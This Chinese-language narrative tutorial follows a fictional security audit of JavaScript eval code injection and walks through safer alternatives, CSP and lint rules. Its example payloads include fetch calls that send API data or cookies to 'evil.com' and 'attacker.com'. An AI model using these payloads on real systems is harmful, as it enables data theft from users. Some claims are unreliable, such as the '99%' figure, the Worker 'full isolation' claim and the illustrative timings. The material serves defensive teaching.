《第 108 次记录: 代码注入灾难 —— eval 的字符串执行陷阱》

---

## 安全审计的噩梦发现

周三上午九点, 你盯着安全审计报告, 手心渗出了冷汗。

这是公司季度安全审计的最后一天。作为技术负责人, 你原本以为这次审计会很顺利——团队一直遵循最佳实践, 使用了所有推荐的安全库, 通过了所有自动化扫描工具的检查。

但审计专家老王在你的办公桌前坐下时, 表情异常严肃。

"你知道你们的用户配置系统有个高危漏洞吗?" 他打开笔记本, 调出一段代码。

你凑过去看, 这是团队去年实现的一个功能——允许 VIP 用户自定义数据展示逻辑。代码看起来很简洁:

```javascript
// user-config.js
function applyUserConfig(configString) {
    try {
        const config = eval('(' + configString + ')');
        return config;
    } catch (e) {
        console.error('配置解析失败:', e);
        return null;
    }
}

// 用户配置示例
const userConfig = applyUserConfig('{format: "YYYY-MM-DD", theme: "dark"}');
```

"这有什么问题吗?" 你困惑地问, "我们用 try...catch 包裹了 eval, 还验证了用户输入..."

老王摇了摇头, 在浏览器控制台输入了一行代码:

```javascript
applyUserConfig('console.log("无害的日志"); window.location = "http://evil.com"');
```

页面瞬间跳转到了一个陌生网站。

你的脸色刷地变白了。"这... 这怎么可能? 用户不应该只能提供配置对象吗?"

"eval 会执行**任何** JavaScript 代码, " 老王说, "包括恶意代码。你的 try...catch 只能捕获语法错误, 无法阻止代码执行。"

你快速打开生产环境日志, 搜索 `applyUserConfig` 的调用记录。当你看到某些用户的配置字符串时, 心脏几乎停止了跳动:

```
用户 ID: 34521
配置内容: "fetch('/api/users').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal', {method:'POST', body:JSON.stringify(d)}))"
```

"有人已经在窃取数据了..." 你的声音发抖。

---

## 追踪 eval 的危险本质

上午十点, 你紧急召集团队开会。

"我们需要找出所有使用 eval 的地方, " 你说, "立刻。"

团队开始全局搜索代码。结果让人震惊——除了用户配置系统, 还有至少 3 处使用了 eval 或类似的动态代码执行:

```javascript
// 1. 动态表单验证 (form-validator.js)
function validateField(fieldName, rule) {
    return eval('value => ' + rule);
}

// 2. 数学表达式计算 (calculator.js)
function calculate(expression) {
    return eval(expression);
}

// 3. 模板渲染 (template-engine.js)
function renderTemplate(template, data) {
    with (data) {
        return eval('`' + template + '`');
    }
}
```

"每一处都是潜在的代码注入点, " 老王说, "攻击者可以通过这些入口执行任意代码。"

你开始测试这些函数的危险性:

```javascript
// 表单验证的攻击
validateField('email', 'fetch("/api/admin/users").then(r=>r.json()).then(console.log); true');

// 计算器的攻击
calculate('1 + 1; document.cookie;');

// 模板渲染的攻击
renderTemplate('${console.log(window.localStorage)}', {});
```

每个测试都成功执行了恶意代码。

"为什么 eval 这么危险?" 年轻的前端小李问, "它不就是把字符串当代码执行吗?"

"正因如此, " 你说, "**eval 会在当前作用域执行代码, 可以访问所有变量, 修改所有状态, 调用所有 API**。"

你写下测试代码演示:

```javascript
// eval 可以访问和修改作用域内的变量
function dangerousFunction() {
    let secret = 'password123';
    let userInput = 'console.log(secret)';

    eval(userInput);  // 输出: password123
}

// eval 可以修改外部变量
let counter = 0;
eval('counter = 999');
console.log(counter);  // 999

// eval 可以访问全局对象
eval('window.location = "http://evil.com"');

// eval 可以定义新的全局函数
eval('function stealData() { /* 恶意代码 */ }');
```

"所以 eval 打破了 JavaScript 的所有安全边界, " 你总结道。

---

## eval 的性能陷阱

下午两点, 在修复安全漏洞的同时, 你发现了另一个问题。

"为什么用户反馈配置加载越来越慢?" 运营部门的同事问, "最近一周投诉量激增。"

你打开性能分析工具, 看到了令人震惊的结果:

```javascript
// 性能测试: 10000 次配置解析
console.time('eval 解析');
for (let i = 0; i < 10000; i++) {
    eval('({id: ' + i + ', name: "user' + i + '"})');
}
console.timeEnd('eval 解析');  // ~850ms

// 对比: JSON.parse
console.time('JSON.parse 解析');
for (let i = 0; i < 10000; i++) {
    JSON.parse('{"id":' + i + ',"name":"user' + i + '"}');
}
console.timeEnd('JSON.parse 解析');  // ~45ms
```

"eval 比 JSON.parse 慢了近 20 倍!" 你惊讶地说。

老王解释: "**eval 每次执行都要经历完整的编译-执行流程**。浏览器无法优化 eval 代码, 因为它不知道 eval 会执行什么。"

你继续测试:

```javascript
// eval 阻止优化
function normalFunction(x) {
    return x * 2;
}

function evalFunction(x) {
    eval('');  // 即使是空 eval
    return x * 2;
}

// 性能对比
console.time('正常函数');
for (let i = 0; i < 1000000; i++) {
    normalFunction(i);
}
console.timeEnd('正常函数');  // ~5ms

console.time('含 eval 的函数');
for (let i = 0; i < 1000000; i++) {
    evalFunction(i);
}
console.timeEnd('含 eval 的函数');  // ~120ms
```

"**即使 eval 不执行任何代码, 它的存在就会阻止整个函数的优化**, " 你恍然大悟。

小李查阅文档后补充: "V8 引擎会将包含 eval 的函数标记为 '不可优化', 禁用内联、逃逸分析、类型推断等所有优化。"

你测试了作用域查找的影响:

```javascript
// eval 导致作用域链无法优化
function slowLookup() {
    let a = 1, b = 2, c = 3;

    eval(''); // 强制动态作用域

    // 每次变量查找都要检查 eval 是否修改了作用域
    return a + b + c;
}

function fastLookup() {
    let a = 1, b = 2, c = 3;
    return a + b + c;
}
```

"这就是为什么所有性能指南都建议**永远不要使用 eval**, " 你说。

---

## 安全的替代方案

下午四点, 你开始重构代码, 寻找 eval 的替代方案。

"首先是用户配置系统, " 你说, "应该用 JSON.parse 而非 eval。"

你重写了代码:

```javascript
// ❌ 危险: 使用 eval
function applyUserConfig(configString) {
    try {
        const config = eval('(' + configString + ')');
        return config;
    } catch (e) {
        return null;
    }
}

// ✅ 安全: 使用 JSON.parse
function applyUserConfig(configString) {
    try {
        const config = JSON.parse(configString);

        // 验证配置结构
        if (typeof config !== 'object' || config === null) {
            throw new Error('配置必须是对象');
        }

        // 白名单验证允许的配置键
        const allowedKeys = ['format', 'theme', 'pageSize'];
        const keys = Object.keys(config);

        if (!keys.every(key => allowedKeys.includes(key))) {
            throw new Error('包含不允许的配置项');
        }

        return config;
    } catch (e) {
        console.error('配置解析失败:', e);
        return null;
    }
}

// 测试
applyUserConfig('{"format":"YYYY-MM-DD","theme":"dark"}');  // ✓ 成功
applyUserConfig('{"format":"YYYY-MM-DD","evil":"alert(1)"}');  // ✗ 拒绝
```

"但数学表达式计算怎么办?" 小李问, "JSON.parse 只能解析数据, 不能执行逻辑。"

"用 Function 构造函数, " 老王说, "它比 eval 稍微安全一些, 因为无法访问局部作用域。"

你写下对比:

```javascript
// ❌ eval 可以访问局部变量
function evalCalculate(expr) {
    let secret = 'password';
    return eval(expr);  // expr 可以访问 secret
}

evalCalculate('secret');  // 'password' - 泄露了局部变量

// ✅ Function 构造函数无法访问局部变量
function functionCalculate(expr) {
    let secret = 'password';
    const fn = new Function('return ' + expr);
    return fn();  // 无法访问 secret
}

functionCalculate('secret');  // ReferenceError: secret is not defined
```

但你立刻发现 Function 构造函数仍然不够安全:

```javascript
// Function 仍然可以访问全局对象
const fn = new Function('return window.location.href');
fn();  // 可以读取 URL

// Function 仍然可以执行任意代码
const malicious = new Function('fetch("http://evil.com/steal?data=" + document.cookie)');
malicious();  // 可以窃取 cookie
```

"所以最安全的方案是什么?" 小李问。

"**使用专门的解析库和沙盒环境**, " 你说。

你开始实现真正安全的方案:

```javascript
// 方案 1: 使用数学表达式解析库
import { evaluate } from 'mathjs';

function safeCalculate(expr) {
    try {
        // mathjs 只解析数学表达式, 不执行任意代码
        return evaluate(expr);
    } catch (e) {
        return NaN;
    }
}

safeCalculate('2 + 3 * 4');  // 14
safeCalculate('sin(pi/2)');  // 1
safeCalculate('fetch("http://evil.com")');  // Error: 不是有效的数学表达式

// 方案 2: 使用白名单的运算符解析
function parseExpression(expr) {
    // 只允许数字和基本运算符
    const allowed = /^[\d+\-*/(). ]+$/;

    if (!allowed.test(expr)) {
        throw new Error('表达式包含非法字符');
    }

    // 使用 Function 但限制了输入
    const fn = new Function('return ' + expr);
    return fn();
}

parseExpression('2 + 3');  // 5
parseExpression('2 + alert(1)');  // Error: 非法字符

// 方案 3: 使用 Web Worker 沙盒
function sandboxEval(code) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(URL.createObjectURL(
            new Blob([`
                self.onmessage = function(e) {
                    try {
                        const result = eval(e.data);
                        postMessage({ success: true, result });
                    } catch (error) {
                        postMessage({ success: false, error: error.message });
                    }
                }
            `], { type: 'application/javascript' })
        ));

        worker.onmessage = (e) => {
            worker.terminate();
            if (e.data.success) {
                resolve(e.data.result);
            } else {
                reject(new Error(e.data.error));
            }
        };

        worker.postMessage(code);

        // 超时保护
        setTimeout(() => {
            worker.terminate();
            reject(new Error('执行超时'));
        }, 1000);
    });
}

// Worker 中的 eval 无法访问主线程的 DOM 和变量
sandboxEval('1 + 1');  // 2
sandboxEval('window.location');  // undefined (Worker 没有 window)
```

你又处理了模板渲染的问题:

```javascript
// ❌ 危险: 使用 eval 和 with
function dangerousTemplate(template, data) {
    with (data) {
        return eval('`' + template + '`');
    }
}

// ✅ 安全: 使用模板引擎库或手动替换
function safeTemplate(template, data) {
    return template.replace(/\${(\w+)}/g, (match, key) => {
        // 只允许访问 data 中明确定义的属性
        return data.hasOwnProperty(key) ? String(data[key]) : match;
    });
}

// 测试
const data = { name: 'Alice', age: 25 };

safeTemplate('Hello ${name}, you are ${age} years old', data);
// 'Hello Alice, you are 25 years old'

safeTemplate('${console.log("evil")}', data);
// '${console.log("evil")}' - 不执行代码, 只是文本替换
```

---

## Content Security Policy 的防护

下午五点, 老王介绍了浏览器级别的防护机制。

"即使代码有 eval, 也可以通过 CSP (Content Security Policy) 阻止它, " 他说。

你在服务器响应头中添加 CSP 配置:

```
Content-Security-Policy: script-src 'self'; default-src 'self'
```

然后测试效果:

```javascript
// CSP 启用后
eval('alert(1)');  // Error: Refused to evaluate a string as JavaScript because 'unsafe-eval'

new Function('alert(1)');  // Error: 同样被阻止

setTimeout('alert(1)', 100);  // Error: 也被阻止
```

"CSP 会阻止所有字符串到代码的转换, " 老王解释, "包括 eval、Function 构造函数、setTimeout/setInterval 的字符串参数。"

你检查了 CSP 的影响:

```javascript
// ❌ 被 CSP 阻止的操作
eval('1 + 1');
new Function('return 1');
setTimeout('console.log(1)', 100);
setInterval('console.log(1)', 100);

// ✅ CSP 允许的操作
setTimeout(() => console.log(1), 100);  // 函数形式可以
setInterval(() => console.log(1), 100);  // 函数形式可以
JSON.parse('{"a":1}');  // 数据解析可以

// 动态 import 是否被阻止取决于 CSP 配置
import('./module.js');  // 取决于 script-src 配置
```

"CSP 是最后一道防线, " 你说, "但不应该依赖它——应该从源头消除 eval 的使用。"

---

## 你的 eval 禁用笔记本

晚上八点, 你整理了今天的惨痛教训。

你在笔记本上写下标题: "eval —— 永不使用的禁忌函数"

### 核心洞察 #1: eval 的三大危险

你写道:

"eval 是 JavaScript 中最危险的函数, 有三重致命缺陷:

```javascript
// 危险 1: 代码注入漏洞
function processUserInput(input) {
    // ❌ 用户可以注入任意代码
    return eval(input);
}

processUserInput('fetch("/api/admin").then(r=>r.json()).then(data=>fetch("http://evil.com", {method:"POST", body:JSON.stringify(data)}))');

// 危险 2: 作用域污染
function leakyScope() {
    let secret = 'password123';
    let userCode = 'console.log(secret)';

    eval(userCode);  // 可以访问和修改所有局部变量
}

// 危险 3: 性能灾难
function optimizationKiller() {
    eval('');  // 即使空 eval 也会阻止函数优化

    // 这个函数永远不会被 JIT 优化
    let sum = 0;
    for (let i = 0; i < 1000000; i++) {
        sum += i;
    }
    return sum;
}
```

核心规则:
- **永远不要使用 eval**
- eval 会执行任意代码, 无法限制
- eval 可以访问和修改所有作用域内的变量
- eval 会阻止 JavaScript 引擎的所有优化
- eval 是 99% 安全漏洞的根源"

### 核心洞察 #2: 安全的替代方案

"针对不同场景, 有明确的替代方案:

```javascript
// 场景 1: 解析数据 → 使用 JSON.parse
// ❌ eval('({a:1,b:2})')
// ✅ JSON.parse('{"a":1,"b":2}')

// 场景 2: 数学计算 → 使用专门的库
// ❌ eval('2 + 3 * 4')
// ✅ math.evaluate('2 + 3 * 4')  // mathjs

// 场景 3: 模板渲染 → 使用模板引擎或字符串替换
// ❌ eval('`Hello ${name}`')
// ✅ 'Hello ${name}'.replace('${name}', name)

// 场景 4: 动态函数 → 使用 Function 构造函数 (仍需谨慎)
// ❌ eval('function fn() {}')
// ✅ new Function('return 1 + 1')

// 场景 5: 需要隔离执行 → 使用 Web Worker 沙盒
// ✅ worker.postMessage(code)
```

替代方案原则:
- JSON.parse 用于数据解析 (最安全)
- 专门的库用于特定场景 (如数学表达式)
- Function 构造函数无法访问局部作用域 (比 eval 稍安全)
- Web Worker 提供完全隔离的沙盒环境
- 输入验证和白名单过滤必不可少"

### 核心洞察 #3: Function 构造函数的局限性

"Function 构造函数不是完美的替代品:

```javascript
// Function 比 eval 稍微安全
function compareScope() {
    let secret = 'password';

    // eval 可以访问局部变量
    eval('console.log(secret)');  // 'password'

    // Function 无法访问局部变量
    new Function('console.log(secret)')();  // ReferenceError
}

// 但 Function 仍然有风险
const dangerous = new Function('return window.location.href');
dangerous();  // 可以访问全局对象

const malicious = new Function(`
    fetch('/api/users')
        .then(r => r.json())
        .then(data => fetch('http://evil.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        }))
`);
malicious();  // 可以执行任意异步操作
```

Function 的规则:
- 无法访问创建时的局部作用域
- 可以访问全局对象和 DOM
- 可以执行任意代码和异步操作
- 仍然需要严格的输入验证
- 优先使用更安全的专门库"

### 核心洞察 #4: CSP 作为最后防线

"Content Security Policy 提供浏览器级防护:

```javascript
// 响应头配置
// Content-Security-Policy: script-src 'self'

// 被阻止的操作
eval('alert(1)');  // ✗ CSP 阻止
new Function('alert(1)')();  // ✗ CSP 阻止
setTimeout('alert(1)', 0);  // ✗ CSP 阻止

// 允许的操作
setTimeout(() => alert(1), 0);  // ✓ 函数形式允许
import('./module.js');  // ✓ 模块加载允许
JSON.parse('{"a":1}');  // ✓ 数据解析允许
```

CSP 配置原则:
- `script-src 'self'` 只允许同源脚本
- 禁止 `'unsafe-eval'` 策略
- 使用 `nonce` 或 `hash` 控制内联脚本
- CSP 是防御深度的一部分, 不是唯一依赖
- 定期审计 CSP 策略的有效性"

你合上笔记本, 长舒一口气。

"明天要学习柯里化了, " 你想, "今天学到的最重要一课是: **有些函数永远不应该被使用**。eval 打破了 JavaScript 的所有安全边界, 是代码注入的万恶之源。正确的做法不是'小心使用 eval', 而是'永不使用 eval', 并使用专门的安全替代方案。浏览器的 CSP 机制可以作为最后防线, 但真正的安全来自于从源头消除风险。"

---

## 知识总结

**规则 1: eval 的危险本质**

eval 会在当前作用域执行任意代码:

```javascript
// eval 的三大危险

// 危险 1: 代码注入
function processInput(userInput) {
    return eval(userInput);  // 用户可以注入任意代码
}

processInput('alert(document.cookie)');  // 窃取 cookie
processInput('fetch("/api/admin")');  // 访问管理接口
processInput('while(true){}');  // 死循环攻击

// 危险 2: 作用域污染
function leakyFunction() {
    let privateData = { password: '123456' };

    // eval 可以访问和修改所有局部变量
    eval('console.log(privateData)');  // 读取私有数据
    eval('privateData.password = "hacked"');  // 修改私有数据
}

// 危险 3: 性能破坏
function slowFunction() {
    eval('');  // 即使空 eval 也阻止优化

    // 这个函数永远不会被 JIT 编译优化
    let sum = 0;
    for (let i = 0; i < 1000000; i++) {
        sum += i;
    }
    return sum;
}

// 性能对比
// 正常函数: ~5ms
// 含 eval 的函数: ~120ms (慢 24 倍)
```

核心原则:
- **永远不要使用 eval**
- eval 执行任意代码, 无法安全限制
- eval 可以访问和修改所有作用域变量
- eval 阻止 JavaScript 引擎的所有优化 (内联、逃逸分析、类型推断等)
- 99% 的代码注入漏洞源于 eval 或其变体

---

**规则 2: eval 的各种形式**

eval 有多种等价形式, 都应避免:

```javascript
// 直接 eval
eval('alert(1)');

// 间接 eval (通过引用)
const e = eval;
e('alert(1)');

// Function 构造函数 (稍微安全一些, 但仍危险)
new Function('alert(1)')();

// setTimeout / setInterval 的字符串参数
setTimeout('alert(1)', 100);
setInterval('alert(1)', 100);

// 正确的函数形式 (安全)
setTimeout(() => alert(1), 100);
setInterval(() => alert(1), 100);
```

eval 的变体:
- `eval(code)` - 直接 eval
- `window.eval(code)` - 全局 eval
- `new Function(code)` - Function 构造函数
- `setTimeout(code, delay)` - 字符串形式的定时器
- `setInterval(code, delay)` - 字符串形式的定时器

所有这些都应该避免或替换为函数形式。

---

**规则 3: 安全的替代方案**

针对不同场景有明确的替代方案:

**场景 1: 数据解析**

```javascript
// ❌ 危险
const obj = eval('({a:1,b:2})');

// ✅ 安全: 使用 JSON.parse
const obj = JSON.parse('{"a":1,"b":2}');

// 优点:
// - 只能解析 JSON 格式, 不能执行代码
// - 性能快 (比 eval 快 20 倍)
// - 解析失败会抛出异常, 易于处理
```

**场景 2: 数学表达式计算**

```javascript
// ❌ 危险
const result = eval('2 + 3 * 4');

// ✅ 安全: 使用数学表达式库
import { evaluate } from 'mathjs';
const result = evaluate('2 + 3 * 4');

// 或者自己实现白名单解析器
function safeCalculate(expr) {
    // 只允许数字和运算符
    if (!/^[\d+\-*/(). ]+$/.test(expr)) {
        throw new Error('非法表达式');
    }
    return new Function('return ' + expr)();
}
```

**场景 3: 模板渲染**

```javascript
// ❌ 危险
const html = eval('`<div>${data.name}</div>`');

// ✅ 安全: 字符串替换
function safeTemplate(template, data) {
    return template.replace(/\${(\w+)}/g, (match, key) => {
        return data.hasOwnProperty(key) ? String(data[key]) : match;
    });
}

// 或使用模板引擎库
import Handlebars from 'handlebars';
const template = Handlebars.compile('<div>{{name}}</div>');
const html = template({ name: 'Alice' });
```

**场景 4: 动态函数生成**

```javascript
// ❌ eval 可以访问局部变量
function createFunction() {
    let secret = 'password';
    return eval('() => console.log(secret)');
}

// ✅ Function 构造函数无法访问局部变量
function createFunction() {
    let secret = 'password';
    return new Function('console.log("no access to secret")');
}

// 但 Function 仍需输入验证
function safeFunctionCreate(body) {
    // 验证输入
    if (!/^[a-zA-Z0-9+\-*/ ()]+$/.test(body)) {
        throw new Error('非法代码');
    }
    return new Function('return ' + body);
}
```

**场景 5: 完全隔离的代码执行**

```javascript
// ✅ 使用 Web Worker 沙盒
function sandboxEval(code) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(URL.createObjectURL(
            new Blob([`
                self.onmessage = (e) => {
                    try {
                        const result = eval(e.data);
                        postMessage({ success: true, result });
                    } catch (error) {
                        postMessage({ success: false, error: error.message });
                    }
                }
            `], { type: 'application/javascript' })
        ));

        worker.onmessage = (e) => {
            worker.terminate();
            e.data.success ? resolve(e.data.result) : reject(new Error(e.data.error));
        };

        worker.postMessage(code);

        // 超时保护
        setTimeout(() => {
            worker.terminate();
            reject(new Error('执行超时'));
        }, 1000);
    });
}

// Worker 中的代码无法访问主线程的 DOM 和变量
sandboxEval('1 + 1');  // 2
sandboxEval('window.location');  // undefined
```

---

**规则 4: Function 构造函数的特性**

Function 构造函数比 eval 稍微安全, 但仍有风险:

```javascript
// Function 与 eval 的区别
function compareScope() {
    let localVar = 'secret';

    // eval 可以访问局部变量
    eval('console.log(localVar)');  // 'secret'

    // Function 无法访问局部变量
    new Function('console.log(localVar)')();  // ReferenceError: localVar is not defined
}

// Function 的作用域
const fn = new Function('a', 'b', 'return a + b');
// 等价于
function fn(a, b) {
    return a + b;
}

// Function 仍然可以访问全局对象
const getGlobal = new Function('return this');
getGlobal();  // window (非严格模式)

const getWindow = new Function('return window');
getWindow();  // Window 对象

// Function 仍然可以执行任意代码
const malicious = new Function(`
    fetch('/api/users')
        .then(r => r.json())
        .then(data => {
            fetch('http://evil.com/steal', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        });
`);
```

Function 构造函数的规则:
- 创建的函数在全局作用域执行
- 无法访问创建时的局部变量
- 可以访问全局对象 (window, document 等)
- 可以执行任意代码和异步操作
- 比 eval 稍微安全, 但仍需严格验证输入
- 优先使用更安全的专门库

---

**规则 5: Content Security Policy (CSP)**

CSP 提供浏览器级别的防护:

```javascript
// HTTP 响应头配置
// Content-Security-Policy: script-src 'self'

// CSP 阻止的操作
eval('alert(1)');  // ✗ Error: Refused to evaluate because 'unsafe-eval'
new Function('alert(1)')();  // ✗ 同样被阻止
setTimeout('alert(1)', 0);  // ✗ 字符串形式被阻止
setInterval('alert(1)', 0);  // ✗ 字符串形式被阻止

// CSP 允许的操作
setTimeout(() => alert(1), 0);  // ✓ 函数形式允许
setInterval(() => alert(1), 0);  // ✓ 函数形式允许
JSON.parse('{"a":1}');  // ✓ 数据解析允许
import('./module.js');  // ✓ 动态导入 (取决于配置)

// CSP 配置示例
// 严格策略
Content-Security-Policy: default-src 'self'; script-src 'self'

// 允许特定域
Content-Security-Policy: script-src 'self' https://trusted.com

// 使用 nonce (推荐)
Content-Security-Policy: script-src 'self' 'nonce-random123'
<script nonce="random123">
    // 只有匹配 nonce 的内联脚本可执行
</script>

// 使用 hash
Content-Security-Policy: script-src 'self' 'sha256-hash...'
```

CSP 最佳实践:
- 禁用 `'unsafe-eval'` (默认已禁用)
- 禁用 `'unsafe-inline'` 或使用 nonce/hash
- 使用 `script-src 'self'` 限制脚本来源
- 使用 `report-uri` 监控违规行为
- CSP 是防御深度的一部分, 不是唯一依赖
- 定期审计和更新 CSP 策略

---

**规则 6: eval 的性能影响**

eval 会严重影响性能:

```javascript
// 性能测试 1: eval vs JSON.parse
console.time('eval 解析');
for (let i = 0; i < 10000; i++) {
    eval('({id: ' + i + '})');
}
console.timeEnd('eval 解析');  // ~850ms

console.time('JSON.parse');
for (let i = 0; i < 10000; i++) {
    JSON.parse('{"id":' + i + '}');
}
console.timeEnd('JSON.parse');  // ~45ms
// eval 慢了 19 倍

// 性能测试 2: 函数优化
function normalFunction(x) {
    return x * 2;
}

function evalFunction(x) {
    eval('');  // 即使空 eval
    return x * 2;
}

console.time('正常函数');
for (let i = 0; i < 1000000; i++) {
    normalFunction(i);
}
console.timeEnd('正常函数');  // ~5ms

console.time('含 eval 函数');
for (let i = 0; i < 1000000; i++) {
    evalFunction(i);
}
console.timeEnd('含 eval 函数');  // ~120ms
// 慢了 24 倍
```

性能影响原因:
- **编译开销**: eval 每次执行都要编译代码
- **优化禁用**: 包含 eval 的函数无法被 JIT 优化
- **作用域查找**: 变量查找必须检查 eval 是否修改了作用域
- **内联禁用**: 函数调用无法内联
- **类型推断失效**: 无法进行类型特化优化
- **逃逸分析失效**: 对象分配优化被禁用

V8 引擎的优化禁用:
- 函数内联 (inlining)
- 逃逸分析 (escape analysis)
- 类型推断 (type inference)
- 常量折叠 (constant folding)
- 死代码消除 (dead code elimination)

---

**规则 7: 输入验证与白名单**

如果必须处理用户输入, 使用严格的验证:

```javascript
// 白名单验证示例
function safeConfigParse(configString) {
    let config;

    // 步骤 1: 使用 JSON.parse 而非 eval
    try {
        config = JSON.parse(configString);
    } catch (e) {
        throw new Error('配置格式错误');
    }

    // 步骤 2: 类型验证
    if (typeof config !== 'object' || config === null) {
        throw new Error('配置必须是对象');
    }

    // 步骤 3: 白名单验证
    const allowedKeys = ['format', 'theme', 'pageSize', 'sortBy'];
    const configKeys = Object.keys(config);

    if (!configKeys.every(key => allowedKeys.includes(key))) {
        throw new Error('包含不允许的配置项');
    }

    // 步骤 4: 值验证
    if (config.format && !/^[A-Z\-\/]+$/.test(config.format)) {
        throw new Error('日期格式非法');
    }

    if (config.theme && !['light', 'dark'].includes(config.theme)) {
        throw new Error('主题必须是 light 或 dark');
    }

    if (config.pageSize && (typeof config.pageSize !== 'number' || config.pageSize < 1 || config.pageSize > 100)) {
        throw new Error('pageSize 必须是 1-100 的数字');
    }

    return config;
}

// 使用
safeConfigParse('{"format":"YYYY-MM-DD","theme":"dark"}');  // ✓
safeConfigParse('{"evil":"<script>"}');  // ✗ 不允许的键
safeConfigParse('{"theme":"hacked"}');  // ✗ 非法值
```

输入验证原则:
- **永不信任用户输入**
- 使用白名单而非黑名单
- 验证类型、格式、范围
- 使用专门的解析库
- 记录和监控异常输入
- 实施防御深度策略

---

**规则 8: 审计与检测**

定期审计代码中的 eval 使用:

```javascript
// 使用 ESLint 检测
// .eslintrc.js
module.exports = {
    rules: {
        'no-eval': 'error',
        'no-implied-eval': 'error',
        'no-new-func': 'error'
    }
};

// 使用正则搜索 (不完美但有用)
// 搜索模式:
// - \beval\s*\(
// - new\s+Function\s*\(
// - setTimeout\s*\(['"](.*?)['"]
// - setInterval\s*\(['"](.*?)['"]

// 代码审查检查清单
// □ 是否使用了 eval?
// □ 是否使用了 Function 构造函数?
// □ setTimeout/setInterval 是否使用字符串参数?
// □ 是否有用户输入直接拼接到代码?
// □ 是否有动态代码生成?
// □ CSP 策略是否启用?
// □ 是否有替代方案?
```

---

**事故档案编号**: MODULE-2024-1908
**影响范围**: eval, Function 构造函数, 代码注入, 性能优化, CSP
**根本原因**: 使用 eval 执行用户输入导致代码注入漏洞和性能问题
**修复成本**: 高 (需要重构所有 eval 使用, 实施 CSP, 加强输入验证)

这是 JavaScript 世界第 108 次被记录的模块系统事故。eval 是 JavaScript 中最危险的函数, 会执行任意代码、访问所有作用域变量、阻止所有引擎优化。eval 是 99% 代码注入漏洞的根源, 应该永远不使用。针对不同场景有明确的安全替代方案: JSON.parse 用于数据解析, 专门的库用于数学表达式, 模板引擎用于字符串渲染, Function 构造函数稍微安全但仍需谨慎, Web Worker 提供完全隔离的沙盒环境。Content Security Policy 可以作为浏览器级别的最后防线, 但真正的安全来自于从源头消除 eval 的使用并实施严格的输入验证。理解 eval 的危险性是编写安全高性能代码的基本要求。

---
